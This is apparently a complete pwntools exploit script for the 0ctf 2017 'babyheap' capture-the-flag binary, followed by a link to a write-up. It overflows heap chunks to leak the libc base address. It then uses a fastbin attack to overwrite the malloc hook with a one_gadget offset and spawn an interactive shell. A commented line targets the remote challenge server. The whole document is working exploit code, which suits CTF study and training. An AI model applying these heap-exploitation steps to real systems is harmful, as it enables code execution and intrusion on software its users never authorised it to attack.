```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

context(arch = 'amd64', os = 'linux', endian='little')
context.log_level = 'debug'

elf_path = './babyheap'
libc_path = './libc.so.6'

elf = ELF(elf_path)
libc = ELF(libc_path)

def Allocate(size):
    #p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def Fill(select, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(select))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)


def Free(select):
    p.recvuntil("Command: ") 
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(select))

def Dump(select):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(select))
    p.recvuntil(': \n')
    data = p.recvline()
    p.recvuntil(': ')
    return data


if __name__ == '__main__':
    #p = process(elf_path, env={"LD_PRELOAD":"./libc.so.6"})
    p = process(elf_path)
    #p = remote('202.120.7.210',12321)
    print proc.pidof(p)
    raw_input("gdb ...")

    Allocate(0x20)
    Allocate(0x20)
    Allocate(0x20)
    Allocate(0x20)
    Allocate(0x80)
    
    Free(1)
    Free(2)

    payload = p64(0) * 5 + p64(0x31) + p64(0) *5 + p64(0x31) +p8(0xc0)
    Fill(0, payload)

    payload2 = p64(0) * 5 +p64(0x31)
    Fill(3, payload2)

    Allocate(0x20)
    Allocate(0x20)

    payload3 = p64(0) * 5 + p64(0x91)
    Fill(3, payload3)
    Allocate(0x80)
    Free(4)

    libc_base = u64(Dump(2)[:8]) - 0x3c3b78 
    print "libc_base:" + hex(libc_base)
    #raw_input("libc has been leak")

    Allocate(0x60)
    Free(4)

    Fill(2, p64(libc_base + 0x3c3aed))
    Allocate(0x60)
    Allocate(0x60)

    payload4 = "\x00" * 3 + p64(0) * 2 + p64(libc_base + 0x4526A)
    #payload4 = "\x00" * 3 + p64(0) * 2 + p64(libc_base + 0x6F5A6)
    Fill(6, payload4)

    Allocate(0x80)

    p.interactive()

```

* [利用分析](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)
